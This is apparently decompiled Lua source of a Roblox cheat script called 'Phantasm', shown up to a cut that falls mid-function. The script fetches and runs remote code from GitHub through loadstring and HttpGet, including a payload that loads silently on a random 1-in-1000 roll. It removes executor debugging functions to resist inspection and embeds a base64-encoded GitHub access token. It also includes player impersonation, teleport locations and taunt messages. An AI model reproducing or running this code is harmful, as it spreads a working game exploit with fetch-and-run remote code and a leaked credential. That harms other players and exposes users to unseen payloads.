if not game:IsLoaded() then
    game.Loaded:Wait();
end;
if getgenv().SonicEXE_Executed then
    return;
else
    if math.random(1, 1000) == 1 then
        getgenv().SonicEXE_Executed = true;
        loadstring(game:HttpGet("https://raw.githubusercontent.com/secretisadev/Phantasm/refs/heads/main/Sonic.lua"))();
    end;
    local v0 = tick();
    task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
        for _, v2 in pairs({
            "getconnections", 
            "hookmetamethod", 
            "hookfunction", 
            "getrawmetatable", 
            "clonefunction", 
            "rconsolecreate", 
            "rconsoleclear", 
            "rconsoledestroy", 
            "rconsoleinput", 
            "rconsoleprint", 
            "rconsolename", 
            "rconsolesettitle", 
            "consolecreate", 
            "consoleclear", 
            "consoledestroy", 
            "consoleinput", 
            "consoleprint", 
            "consolesettitle"
        }) do
            local v3 = getgenv()[v2] or _G[v2];
            getgenv()[v2] = nil;
            _G[v2] = nil;
            table.remove(getgenv(), table.find(getgenv(), v3));
            table.remove(_G, table.find(_G, v3));
            if v3 then
                for v4, v5 in pairs(getgenv()) do
                    if v5 == v3 then
                        getgenv()[v4] = nil;
                    end;
                end;
                for v6, v7 in pairs(_G) do
                    if v7 == v3 then
                        _G[v6] = nil;
                    end;
                end;
            end;
        end;
    end);
    local v10 = setmetatable({}, {
        __index = function(_, v9) --[[ Line: 0 ]] --[[ Name:  ]]
            return cloneref(game:GetService(v9));
        end
    });
    local l_Players_0 = v10.Players;
    local v12 = l_Players_0.LocalPlayer or v10.NetworkClient:FindFirstChildWhichIsA("ClientReplicator"):GetPlayer();
    local l_v12_Mouse_0 = v12:GetMouse();
    local l_Workspace_0 = v10.Workspace;
    local l_CoreGui_0 = v10.CoreGui;
    local _ = v12.PlayerGui;
    local _ = v10.GuiService;
    local v18 = nil;
    if not protectgui then
        local function _() --[[ Line: 0 ]] --[[ Name:  ]]

        end;
    end;
    if get_hidden_gui or gethui then
        v18 = (get_hidden_gui or gethui)();
    elseif l_CoreGui_0:FindFirstChild("RobloxGui") then
        v18 = l_CoreGui_0.RobloxGui;
    end;
    local v20 = nil;
    if not v18.FindFirstChild(v18, "LoadingGui") then
        local v21 = Instance.new("ScreenGui", v18);
        v21.ResetOnSpawn = false;
        v21.DisplayOrder = math.huge;
        v21.Name = "LoadingGui";
        v20 = Instance.new("TextLabel", v21);
        v20.Text = "";
        v20.TextSize = 15;
        v20.Font = Enum.Font.Gotham;
        v20.TextTransparency = 0;
        v20.BackgroundTransparency = 1;
        v20.TextColor3 = Color3.fromRGB(255, 255, 255);
        v20.Position = UDim2.new(0.5, 0, 0.085, 0);
        v20.ZIndex = math.huge;
        local v22 = "Loading..";
        local v23 = 0;
        repeat
            v23 = v23 + 1;
            v20.Text = v22:sub(1, v23);
            task.wait(0.03);
        until v20.Text == v22 or not v21;
    end;
    if not isfolder("Libraries") then
        v20.Text = "Creating 'Libraries'";
        makefolder("Libraries");
    end;
    if not isfile("Libraries/sha.lua") then
        v20.Text = "Downloading 'sha.lua'";
        writefile("Libraries/sha.lua", game:HttpGet("https://raw.githubusercontent.com/secretisadev/Backup/refs/heads/main/sha.lua"));
    end;
    local v24 = loadfile("Libraries/sha.lua")();
    if not cloneref then
        local function _(v25) --[[ Line: 0 ]] --[[ Name:  ]]
            return v25;
        end;
    end;
    local v27 = http_request or request or syn and syn.request or fluxus and fluxus.request or http and http.request;
    if not setclipboard and not toclipboard and not set_clipboard and Clipboard then
        local _ = Clipboard.set;
    end;
    local v29 = base64 and base64.decode or base64decode or base64_decode;
    if not fireclickdetector then
        local function _() --[[ Line: 0 ]] --[[ Name:  ]]

        end;
    end;
    if not firetouchinterest then
        local function _() --[[ Line: 0 ]] --[[ Name:  ]]

        end;
    end;
    local v32 = false;
    local v33 = false;
    local v34 = {};
    if not v27 or typeof(v27) ~= "function" then
        return;
    else
        local _ = v10.LocalizationService;
        local l_Debris_0 = v10.Debris;
        local l_RunService_0 = v10.RunService;
        local l_RenderStepped_0 = l_RunService_0.RenderStepped;
        local l_Heartbeat_0 = l_RunService_0.Heartbeat;
        local l_Stepped_0 = l_RunService_0.Stepped;
        local l_PreSimulation_0 = l_RunService_0.PreSimulation;
        local _ = l_RunService_0.PostSimulation;
        local _ = l_RunService_0.PreAnimation;
        local l_ReplicatedStorage_0 = v10.ReplicatedStorage;
        local _ = v10.MarketplaceService;
        local l_UserInputService_0 = v10.UserInputService;
        local l_TextChatService_0 = v10.TextChatService;
        local _ = l_TextChatService_0.BubbleChatConfiguration;
        local l_TweenService_0 = v10.TweenService;
        local l_TeleportService_0 = v10.TeleportService;
        local _ = v10.MarketplaceService;
        local _ = v10.SoundService;
        local l_Stats_0 = v10.Stats;
        local _ = v10.ScriptContext;
        local _ = v10.ContentProvider;
        local l_StarterGui_0 = v10.StarterGui;
        local l_HttpService_0 = v10.HttpService;
        local _ = v10.Chat;
        local l_Lighting_0 = v10.Lighting;
        local _ = v10.PhysicsService;
        local _ = v10.TestService;
        local _ = v10.CaptureService;
        local _ = v10.ProximityPromptService;
        if not loadstring(game:HttpGet("https://raw.githubusercontent.com/secretisadev/Phantasm/refs/heads/main/Active.lua"))() then
            return;
        elseif getgenv().PhantasmExecuted then
            return l_StarterGui_0:SetCore("SendNotification", {
                Text = "Phantasm", 
                Text = "Phantasm is already loading/loaded.", 
                Duration = 3
            });
        else
            getgenv().PhantasmExecuted = true;
            local l_RobloxReplicatedStorage_0 = v10.RobloxReplicatedStorage;
            local l_RbxAnalyticsService_0 = v10.RbxAnalyticsService;
            local _ = {};
            local v67 = {};
            local v68 = {};
            local v69 = {};
            local v70 = {
                Players = {}
            };
            local v71 = {
                Notification = 4590657391
            };
            local v72 = {
                ["Above Tunnel"] = CFrame.new(-301, 594, -322), 
                Arena = CFrame.new(-130, 440, -373), 
                ["Atomic Slash"] = CFrame.new(1064, 131, 23007), 
                Baseplate = CFrame.new(1073, 406, 22984), 
                ["Below Baseplate"] = CFrame.new(1073, 20, 22984), 
                ["Bigger Jail"] = CFrame.new(290, 440, 465), 
                ["Even Bigger Jail"] = CFrame.new(378, 439, 457), 
                ["Dark Domain"] = CFrame.new(-80, 84, 20395), 
                ["Death Counter"] = CFrame.new(-66, 29, 20383), 
                Jail = CFrame.new(440, 440, -395), 
                ["Jail But Smaller"] = CFrame.new(20, 439, -460), 
                Middle = CFrame.new(150, 441, 32), 
                ["Mountain 1"] = CFrame.new(9, 653, -363), 
                ["Mountain 2"] = CFrame.new(-1, 653, -354), 
                ["Mountain Edge"] = CFrame.new(-297, 594, -336), 
                Void = CFrame.new(0, -10000, 0)
            };
            local v73 = {};
            for v74 in pairs(v72) do
                table.insert(v73, v74);
            end;
            table.sort(v73);
            local v75 = {
                ["Atomic Slash"] = CFrame.new(1064, 131, 23007) * CFrame.new(0, -0.5, 0) * CFrame.Angles(math.rad(-90), 0, 0), 
                Arena = CFrame.new(-130, 440, -373) * CFrame.new(0, -0.5, 0) * CFrame.Angles(math.rad(-90), 0, 0), 
                Baseplate = CFrame.new(1073, 407, 22984) * CFrame.new(0, -0.5, 0) * CFrame.Angles(math.rad(-90), 0, 0), 
                ["Below Baseplate"] = CFrame.new(1073, 20, 22984) * CFrame.new(0, -0.5, 0) * CFrame.Angles(math.rad(-90), 0, 0), 
                Jail = CFrame.new(440, 440, -395) * CFrame.new(0, -0.5, 0) * CFrame.Angles(math.rad(-90), 0, 0), 
                ["Jail But Smaller"] = CFrame.new(20, 439, -460) * CFrame.new(0, -0.5, 0) * CFrame.Angles(math.rad(-90), 0, 0), 
                ["Bigger Jail"] = CFrame.new(290, 440, 465) * CFrame.new(0, -0.5, 0) * CFrame.Angles(math.rad(-90), 0, 0), 
                ["Even Bigger Jail"] = CFrame.new(378, 439, 457) * CFrame.new(0, -0.5, 0) * CFrame.Angles(math.rad(-90), 0, 0), 
                ["Dark Domain"] = CFrame.new(-80, 84, 20395) * CFrame.new(0, -0.5, 0) * CFrame.Angles(math.rad(-90), 0, 0), 
                ["Death Counter"] = CFrame.new(-66, 29, 20383) * CFrame.new(0, -0.5, 0) * CFrame.Angles(math.rad(-90), 0, 0), 
                Middle = CFrame.new(155, 441, 45) * CFrame.new(0, -0.5, 0) * CFrame.Angles(math.rad(-90), 0, 0), 
                ["Mountain 1"] = CFrame.new(306, 671, 411) * CFrame.new(0, -0.5, 0) * CFrame.Angles(math.rad(-90), 0, 0), 
                ["Mountain 2"] = CFrame.new(-1, 653, -354) * CFrame.new(0, -0.5, 0) * CFrame.Angles(math.rad(-90), 0, 0), 
                ["Mountain Edge"] = CFrame.new(-297, 594, -336) * CFrame.new(0, -0.5, 0) * CFrame.Angles(math.rad(-90), 0, 0), 
                Void = CFrame.new(169, 218, 102) * CFrame.new(0, 1.5, 0) * CFrame.Angles(math.rad(90), 0, 0)
            };
            local v76 = {};
            for v77 in pairs(v75) do
                table.insert(v76, v77);
            end;
            table.sort(v76);
            local _ = {
                Ult = {
                    [1] = "rbxassetid://17140902079", 
                    [2] = "rbxassetid://18445236460"
                }, 
                SpawnAnimation = "rbxassetid://17325160621", 
                SwiftSweep = "rbxassetid://16944345619", 
                CollateralRuin = "rbxassetid://17325254223", 
                StoicBomb = "rbxassetid://17141153099", 
                Dropkick = {
                    Hit = "rbxassetid://17420452843", 
                    Victim = "rbxassetid://17363256069", 
                    Full = "rbxassetid://17354976067"
                }, 
                Ravage = {
                    Startup = "rbxassetid://16945573694", 
                    Victim = "rbxassetid://16945557433", 
                    Full = "rbxassetid://16945550029"
                }, 
                WallCombo = {
                    Victim = "rbxassetid://18447915110", 
                    Full = "rbxassetid://18447913645"
                }, 
                FiveSeasons = {
                    Teleport = "rbxassetid://18461128573", 
                    Fly = "rbxassetid://18462892217", 
                    Punch = "rbxassetid://18462894593"
                }
            };
            local _ = {
                "did TheEnemysNameHere just try to death counter me?", 
                "death counter won't work on me, TheEnemysNameHere", 
                "i've been death countered hundreds of times", 
                "you should focus on landing your other 3 moves instead of death counter", 
                "has it occurred to you anti death counter exists?"
            };
            local v80 = {
                Normal = {
                    "did you really think you could kill me TheEnemysNameHere....?", 
                    "did you forget its me, YourUppercaseNameHere?", 
                    "I'm not gonna let that slide, TheEnemysNameHere."
                }, 
                Gojo = {
                    "YOU LOOK UGLIER THAN EVER, TheEnemysUppercaseNameHere!!"
                }
            };
            local _ = {
                "this is phantasm btw | https://dsc.gg/thephantasm"
            };
            v80.Gojo[#v80.Gojo + 1] = {
                [1] = {
                    Quote = "It took me a while..", 
                    WaitTime = 2
                }, 
                [2] = {
                    Quote = "But I finally grasped it on the verge of death TheEnemysNameHere..", 
                    WaitTime = 2
                }, 
                [3] = {
                    Quote = "The true essence of cursed energy..", 
                    WaitTime = 2
                }, 
                [4] = {
                    Quote = "REVERSE CURSED TECHNIQUE!!", 
                    WaitTime = 0
                }
            };
            local _ = "rbxassetid://18249294373";
            local v83 = table.find({
                Enum.Platform.IOS, 
                Enum.Platform.Android
            }, l_UserInputService_0:GetPlatform()) and true or false;
            local v84 = {
                "rbxassetid://12351854556", 
                "rbxassetid://15311685628", 
                "rbxassetid://15128849047"
            };
            local v85 = {
                "rbxassetid://13603396939", 
                "rbxassetid://15334974550", 
                "rbxassetid://15123665491"
            };
            local v86 = {
                "rbxassetid://10470389827", 
                "rbxassetid://13380778193", 
                "rbxassetid://13935548552", 
                "rbxassetid://13380778193"
            };
            local v87 = {
                "rbxassetid://10480796021", 
                "rbxassetid://10480793962"
            };
            local _ = {
                Saitama = "rbxassetid://12447707844"
            };
            local _ = {
                ["Normal Punch"] = "rbxassetid://10468665991", 
                ["Consecutive Punches"] = "rbxassetid://10466974800", 
                Shove = "rbxassetid://10471336737", 
                Uppercut = "rbxassetid://12510170988", 
                ["Windstorm Fury"] = "rbxassetid://16515850153", 
                ["Stone Grave"] = "rbxassetid://16431491215", 
                ["Expulsive Push Hit"] = "rbxassetid://16597912086"
            };
            local _ = {
                ["Star Creator"] = "rbxassetid://11322155020", 
                Verified = "rbxassetid://11478378840", 
                Premium = "rbxassetid://10885647358", 
                ["Roblox Administrator"] = "rbxassetid://10885644041", 
                Owner = "rbxassetid://10885637246", 
                Developer = "rbxassetid://10885640682"
            };
            local v91 = {
                ID = "rbxassetid://136370737633649", 
                TimePosition = 4.5
            };
            local _ = {
                "rbxassetid://12273188754", 
                "rbxassetid://12296113986", 
                "rbxassetid://12309835105"
            };
            local v93 = {
                18182425133, 
                136370737633649
            };
            local v94 = {
                Invisibility = false, 
                ["Upside Down"] = false, 
                ["Velocity Spoof"] = false, 
                Flying = false, 
                ["Pause Orbit"] = false, 
                ["Trashcan Launch"] = false, 
                ["Doing Wall Combo Anywhere"] = false, 
                ["Velocity Spoof Settings"] = Vector3.new(0, 0, 0)
            };
            local v95 = {};
            local v96 = {};
            local v97 = {};
            local v98 = {};
            GetServerType = function() --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: l_RobloxReplicatedStorage_0 (ref)
                local v99 = l_RobloxReplicatedStorage_0:WaitForChild("GetServerType", 1);
                if v99 then
                    return (v99:InvokeServer());
                else
                    return "Unknown Server";
                end;
            end;
            GetServerVersion = function() --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: l_RobloxReplicatedStorage_0 (ref)
                local v100 = l_RobloxReplicatedStorage_0:WaitForChild("GetServerVersion", 1);
                if v100 then
                    return (v100:InvokeServer());
                else
                    return "Unknown Version";
                end;
            end;
            local v101 = GetServerType();
            local v102 = GetServerVersion();
            Create = function(v103, v104) --[[ Line: 0 ]] --[[ Name:  ]]
                local l_v103_0 = v103;
                if typeof(v103) == "string" then
                    l_v103_0 = Instance.new(v103);
                end;
                for v106, v107 in next, v104 do
                    do
                        local l_v106_0, l_v107_0 = v106, v107;
                        local l_status_0, l_result_0 = pcall(function() --[[ Line: 0 ]] --[[ Name:  ]]
                            -- upvalues: l_v103_0 (ref), l_v106_0 (ref), l_v107_0 (ref)
                            l_v103_0[l_v106_0] = l_v107_0;
                        end);
                        if not l_status_0 then
                            warn(l_result_0);
                        end;
                    end;
                end;
                return l_v103_0;
            end;
            Draw = function(v112, v113) --[[ Line: 0 ]] --[[ Name:  ]]
                local l_v112_0 = v112;
                if typeof(v112) == "string" then
                    l_v112_0 = Drawing.new(v112);
                end;
                for v115, v116 in next, v113 do
                    do
                        local l_v115_0, l_v116_0 = v115, v116;
                        local l_status_1, l_result_1 = pcall(function() --[[ Line: 0 ]] --[[ Name:  ]]
                            -- upvalues: l_v112_0 (ref), l_v115_0 (ref), l_v116_0 (ref)
                            l_v112_0[l_v115_0] = l_v116_0;
                        end);
                        if not l_status_1 then
                            warn(l_result_1);
                        end;
                    end;
                end;
                return l_v112_0;
            end;
            fetchAvatar = function() --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v12 (ref), l_HttpService_0 (ref)
                local v121 = nil;
                pcall(function() --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: v12 (ref), l_HttpService_0 (ref), v121 (ref)
                    local v122 = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. v12.UserId .. "&size=150x150&format=Png";
                    local v123 = game:HttpGet(v122);
                    v121 = l_HttpService_0:JSONDecode(v123).data[1].imageUrl;
                end);
                return v121 or "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-310966282D3529E36976BF6B07B1DC90-Png/150/150/AvatarHeadshot/Png/noFilter";
            end;
            bypassText = function(v124) --[[ Line: 0 ]] --[[ Name:  ]]
                local _ = {
                    a = "\239\191\189", 
                    c = "\239\191\189", 
                    d = "\239\191\189", 
                    e = "\239\191\189", 
                    h = "\239\191\189", 
                    i = "\239\191\189", 
                    j = "\239\191\189", 
                    l = "\239\191\189", 
                    o = "\239\191\189", 
                    p = "\239\191\189", 
                    q = "\239\191\189", 
                    s = "\239\191\189", 
                    v = "\239\191\189", 
                    x = "\239\191\189", 
                    y = "\239\191\189", 
                    A = "\239\191\189", 
                    B = "\239\191\189", 
                    C = "\239\191\189", 
                    E = "\239\191\189", 
                    H = "\239\191\189", 
                    I = "\239\191\189", 
                    J = "\239\191\189", 
                    M = "\239\191\189", 
                    N = "\239\191\189", 
                    O = "\239\191\189", 
                    P = "\239\191\189", 
                    S = "\239\191\189", 
                    T = "\239\191\189", 
                    X = "\239\191\189", 
                    Y = "\239\191\189"
                };
                return v124;
            end;
            holiday = function(v126, v127) --[[ Line: 0 ]] --[[ Name:  ]]
                local v135 = ({
                    ["01 01"] = "\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189", 
                    [(function(v128) --[[ Line: 0 ]] --[[ Name:  ]]
                        local v129 = math.floor(v128 / 100);
                        local v130 = (15 - math.floor((13 + 8 * v129) / 25) + v129 - math.floor(v129 / 4)) % 30;
                        local v131 = (4 + v129 - math.floor(v129 / 4)) % 7;
                        local v132 = (19 * (v128 % 19) + v130) % 30;
                        local v133 = (2 * (v128 % 4) + 4 * (v128 % 7) + 6 * v132 + v131) % 7;
                        local v134 = 22 + v132 + v133;
                        if v132 == 29 and v133 == 6 then
                            return "04 19";
                        elseif v132 == 28 and v133 == 6 then
                            return "04 18";
                        elseif v134 > 31 then
                            return ("04 %02d"):format(v134 - 31);
                        else
                            return ("03 %02d"):format(v134);
                        end;
                    end)(tonumber(os.date("%Y")))] = "\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189", 
                    ["10 31"] = "\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189"
                })[os.date("%m %d")];
                if v135 then
                    return ("%s %s %s"):format(v135, v126, v135);
                else
                    local v136 = {
                        ["12 25"] = "\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189"
                    };
                    if v127 and v127.entireChristmas then
                        for v137 = 1, 31 do
                            v136["12 " .. tostring(v137)] = ({
                                "\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189", 
                                "\239\191\189\239\191\189"
                            })[math.random(1, 2)];
                        end;
                    end;
                    local v138 = v136[os.date("%m %d")];
                    if v138 then
                        return ("%s %s %s"):format(v138, v126, v138);
                    else
                        return v126;
                    end;
                end;
            end;
            formatDateTime = function(v139) --[[ Line: 0 ]] --[[ Name:  ]]
                local v149 = (function(v140) --[[ Line: 0 ]] --[[ Name:  ]]
                    local v141, v142 = v140:match("^(%d+-%d+-%d+)T(%d+:%d+:%d+)");
                    if not v141 or not v142 then
                        return nil;
                    else
                        local v143, v144, v145 = v141:match("(%d+)-(%d+)-(%d+)");
                        local v146, v147, v148 = v142:match("(%d+):(%d+):(%d+)");
                        return os.time({
                            year = tonumber(v143), 
                            month = tonumber(v144), 
                            day = tonumber(v145), 
                            hour = tonumber(v146), 
                            min = tonumber(v147), 
                            sec = tonumber(v148), 
                            isdst = false
                        });
                    end;
                end)(v139);
                if not v149 then
                    return "Invalid date format";
                else
                    local v150 = os.time();
                    local v151 = os.difftime(v150, v149);
                    local v152 = os.date("%A %B %d/%m/%Y", v149);
                    if v151 < 86400 then
                        local v153 = math.floor(v151 / 3600);
                        return v152 .. " (" .. v153 .. " hour" .. (v153 ~= 1 and "s" or "") .. " ago)";
                    elseif v151 < 31536000 then
                        local v154 = math.floor(v151 / 86400);
                        return v152 .. " (" .. v154 .. " day" .. (v154 ~= 1 and "s" or "") .. " ago)";
                    else
                        local v155 = math.floor(v151 / 31536000);
                        return v152 .. " (" .. v155 .. " year" .. (v155 ~= 1 and "s" or "") .. " ago)";
                    end;
                end;
            end;
            messageToQuote = function(v156, v157) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v12 (ref)
                return (v156:gsub("TheEnemysNameHere", v157.DisplayName):gsub("TheEnemysUppercaseNameHere", v157.DisplayName:upper()):gsub("YourNameHere", v12.DisplayName):gsub("YourUppercaseNameHere", v12.DisplayName:upper()));
            end;
            local v158 = {};
            disguiseAsPlayer = function(v159) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v12 (ref), l_Players_0 (ref), v158 (ref)
                if #v159 == 0 then
                    return;
                else
                    local v160 = getChar and getChar(v12);
                    local v161 = v160 and getHumanoid(v160);
                    v160:SetAttribute("DisguiseName", v159);
                    local v162 = nil;
                    pcall(function() --[[ Line: 0 ]] --[[ Name:  ]]
                        -- upvalues: v162 (ref), l_Players_0 (ref), v159 (ref)
                        v162 = l_Players_0:GetUserIdFromNameAsync(v159);
                    end);
                    local v163 = v162 and l_Players_0:GetCharacterAppearanceAsync(v162);
                    if v160 and v161 and v162 and v163 then
                        local v164 = v160 and v160:WaitForChild("Head", 1);
                        if v164 then
                            local v165 = {
                                "Accessory", 
                                "Shirt", 
                                "Pants", 
                                "CharacterMesh", 
                                "BodyColors", 
                                "ShirtGraphic"
                            };
                            for _, v167 in pairs(v160:GetChildren()) do
                                for _, v169 in pairs(v165) do
                                    if v167:IsA(v169) then
                                        task.spawn(pcall, deleteNew, v167, false);
                                    end;
                                end;
                            end;
                            for _, v171 in pairs(v164:GetChildren()) do
                                if v171:IsA("SpecialMesh") and table.find(v158, v171) then
                                    task.spawn(pcall, deleteNew, v171, false);
                                end;
                            end;
                            local l_face_0 = v164:FindFirstChild("face");
                            if l_face_0 then
                                l_face_0:Destroy();
                            end;
                            for _, v174 in pairs(v163:GetChildren()) do
                                if v174:IsA("Shirt") or v174:IsA("Pants") or v174:IsA("BodyColors") or v174:IsA("ShirtGraphic") then
                                    v174.Parent = v12.Character;
                                elseif v174:IsA("Accessory") then
                                    v174.Name = "#ACCESSORY_" .. v174.Name;
                                    v174.Parent = v12.Character;
                                elseif v174:IsA("SpecialMesh") then
                                    table.insert(v158, v174);
                                    v174.Parent = v12.Character.Head;
                                elseif v174.Name == "R6" then
                                    if v12.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
                                        v174:FindFirstChildOfClass("CharacterMesh").Parent = v12.Character;
                                    end;
                                elseif v174.Name == "R15" and v12.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
                                    v174:FindFirstChildOfClass("CharacterMesh").Parent = v12.Character;
                                end;
                            end;
                            local l_face_1 = v163:FindFirstChild("face");
                            if l_face_1 then
                                l_face_1.Parent = v164;
                            else
                                local v176 = Instance.new("Decal", v164);
                                v176.Face = "Front";
                                v176.Name = "face";
                                v176.Texture = "rbxasset://textures/face.png";
                                v176.Transparency = 0;
                            end;
                            local l_Parent_0 = v160.Parent;
                            v160.Parent = nil;
                            v160.Parent = l_Parent_0;
                        end;
                    end;
                    return;
                end;
            end;
            WaitForChildWhichIsA = function(v178, v179, v180) --[[ Line: 0 ]] --[[ Name:  ]]
                local l_v178_0 = v178;
                local v182 = tick();
                if not l_v178_0:FindFirstChildWhichIsA(v179) then
                    repeat
                        task.wait();
                    until l_v178_0:FindFirstChildWhichIsA(v179) or v180 and tick() >= v182 + v180;
                end;
                return l_v178_0:FindFirstChildWhichIsA(v179) or nil;
            end;
            getPlayer = function(v183, v184, v185) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: l_Players_0 (ref), v12 (ref)
                for _, v187 in pairs(l_Players_0:GetPlayers()) do
                    if (v187.Name:lower():find("^" .. v183:lower()) or v187.DisplayName:lower():find("^" .. v183:lower())) and (v187 ~= v12 or not not v185) then
                        return v187;
                    end;
                end;
                if v184 and #l_Players_0:GetChildren() >= 2 then
                    local v188 = nil;
                    repeat
                        v188 = l_Players_0:GetChildren()[math.random(1, #l_Players_0:GetChildren())];
                        task.wait();
                    until v188 ~= v12;
                end;
                return nil;
            end;
            getAllPlayers = function() --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: l_Players_0 (ref), v12 (ref), v98 (ref)
                local l_l_Players_0_Players_0 = l_Players_0:GetPlayers();
                table.remove(l_l_Players_0_Players_0, table.find(l_l_Players_0_Players_0, v12));
                for _, v191 in pairs(v98) do
                    table.remove(l_l_Players_0_Players_0, table.find(l_l_Players_0_Players_0, v191));
                end;
                return l_l_Players_0_Players_0;
            end;
            getHighestStreak = function() --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: l_Players_0 (ref)
                local v192 = nil;
                local v193 = 0;
                for _, v195 in pairs(l_Players_0:GetPlayers()) do
                    local v196 = getChar(v195);
                    local v197 = v196 and (v196:GetAttribute("CurrentStreak") or 0);
                    if v196 and v193 < v197 then
                        v193 = v197;
                        v192 = v195;
                    end;
                end;
                return v192;
            end;
            rejoin = function(v198) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v12 (ref), v101 (ref), l_TeleportService_0 (ref)
                local v199 = typeof(v198) == "table" and v198 or nil;
                v12:Kick(v199 and v199.Message or "Rejoining....");
                task.delay(v199 and v199.Delay or 0.1, function() --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: v101 (ref), l_TeleportService_0 (ref), v12 (ref)
                    if v101 == "VIPServer" then
                        l_TeleportService_0:Teleport(game.PlaceId, v12);
                    else
                        l_TeleportService_0:TeleportToPlaceInstance(game.PlaceId, game.JobId, v12);
                    end;
                end);
            end;
            local v200 = nil;
            patchCamera = function(v201) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v200 (ref)
                if v201:IsA("Camera") then
                    if v200 then
                        v200:Disconnect();
                        v200 = nil;
                    end;
                    if v201.CameraType ~= Enum.CameraType.Custom and Toggles.NoCameraAnimations.Value then
                        task.spawn(fixCam);
                    end;
                    v200 = v201:GetPropertyChangedSignal("CameraType"):Connect(function() --[[ Line: 0 ]] --[[ Name:  ]]
                        -- upvalues: v201 (ref)
                        if v201.CameraType ~= Enum.CameraType.Custom and Toggles.NoCameraAnimations.Value then
                            task.spawn(fixCam);
                        end;
                    end);
                end;
            end;
            getDepen = function(v202) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v27 (ref), v29 (ref), l_HttpService_0 (ref)
                local v203 = "https://api.github.com/repos/secretisadev/Security/contents/" .. v202;
                local l_Body_0 = v27({
                    Url = v203, 
                    Method = "GET", 
                    Headers = {
                        Authorization = "Bearer " .. v29("Z2l0aHViX3BhdF8xMUE3UjZXWEEwYjZ5N3hPaXJKM0pjX3B2Qkd4bGlNTEM0aUpIV29ENm1zMGd3NU5Kd1QxbVNSRHhWNWNUUFp1VDNWSVdZTk1FSzlGSElRUUZh")
                    }
                }).Body;
                local v205 = l_HttpService_0:JSONDecode(l_Body_0);
                return v27({
                    Url = v205.download_url, 
                    Method = "GET"
                }).Body;
            end;
            if getDepen("Up-Check.lua"):gsub("\n", "") ~= "ut1u2ih5YTuieuthui21tug1u35g12345huohuoawierawoietijqwoietjowiqer" then
                task.wait(1100000000000);
            end;
            getChar = function(v206) --[[ Line: 0 ]] --[[ Name:  ]]
                return v206.Character;
            end;
            getRoot = function(v207) --[[ Line: 0 ]] --[[ Name:  ]]
                if v207 then
                    local l_HumanoidRootPart_0 = v207:FindFirstChild("HumanoidRootPart");
                    if l_HumanoidRootPart_0 then
                        return l_HumanoidRootPart_0;
                    end;
                end;
                return nil;
            end;
            getHumanoid = function(v209) --[[ Line: 0 ]] --[[ Name:  ]]
                if v209 then
                    local l_Humanoid_0 = v209:FindFirstChild("Humanoid");
                    if l_Humanoid_0 then
                        return l_Humanoid_0;
                    end;
                end;
                return nil;
            end;
            getMagnitude = function(v211, v212) --[[ Line: 0 ]] --[[ Name:  ]]
                if typeof(v211) == "number" then
                    v211 = Vector3.new(v211, v211, v211);
                end;
                if typeof(v212) == "number" then
                    v212 = Vector3.new(v212, v212, v212);
                end;
                return (v211 - v212).Magnitude;
            end;
            fixCam = function() --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v12 (ref), l_Workspace_0 (ref)
                if not getChar(v12) then
                    repeat
                        task.wait();
                    until getChar(v12);
                end;
                local v213 = getChar(v12);
                local v214 = v213 and getHumanoid(v213);
                if v213 and v214 and workspace.CurrentCamera then
                    local l_CFrame_0 = l_Workspace_0.CurrentCamera.CFrame;
                    l_Workspace_0.CurrentCamera:Destroy();
                    local v216 = Instance.new("Camera", l_Workspace_0);
                    v216.CameraType = "Custom";
                    v216.CameraSubject = v214;
                    v216.CFrame = l_CFrame_0;
                    v12.CameraMode = "Classic";
                    v213:WaitForChild("Head", 1).Anchored = false;
                end;
            end;
            sendMsg = function(v217) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: l_TextChatService_0 (ref), l_ReplicatedStorage_0 (ref)
                if l_TextChatService_0.ChatVersion == Enum.ChatVersion.LegacyChatService then
                    local l_DefaultChatSystemChatEvents_0 = l_ReplicatedStorage_0:FindFirstChild("DefaultChatSystemChatEvents");
                    local v219 = l_DefaultChatSystemChatEvents_0 and l_DefaultChatSystemChatEvents_0:FindFirstChild("SayMessageRequest");
                    if l_DefaultChatSystemChatEvents_0 and v219 then
                        v219:FireServer(v217, "all");
                    end;
                elseif l_TextChatService_0.ChatVersion == Enum.ChatVersion.TextChatService then
                    local l_TextChannels_0 = l_TextChatService_0.TextChannels;
                    local l_RBXGeneral_0 = l_TextChannels_0:FindFirstChild("RBXGeneral");
                    if l_TextChannels_0 and l_RBXGeneral_0 then
                        l_RBXGeneral_0:SendAsync(v217);
                    end;
                end;
            end;
            closestPlayer = function(v222, v223) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v12 (ref), l_Players_0 (ref), l_v12_Mouse_0 (ref)
                local v224 = getChar and getChar(v12);
                local l_huge_0 = math.huge;
                local v226 = nil;
                for _, v228 in pairs(l_Players_0:GetPlayers()) do
                    if getChar(v228) and v228 ~= v12 then
                        local v229 = getChar(v228);
                        local v230 = getHumanoid(v229);
                        if v230 and v230.Health ~= 0 then
                            local v231 = v229 and getRoot(v229);
                            local v232 = nil;
                            if v222 then
                                v232 = (l_v12_Mouse_0.Hit.p - v231.Position).Magnitude;
                            elseif not v222 then
                                v232 = (getRoot(v224).Position - v231.Position).Magnitude;
                            end;
                            if v232 < l_huge_0 then
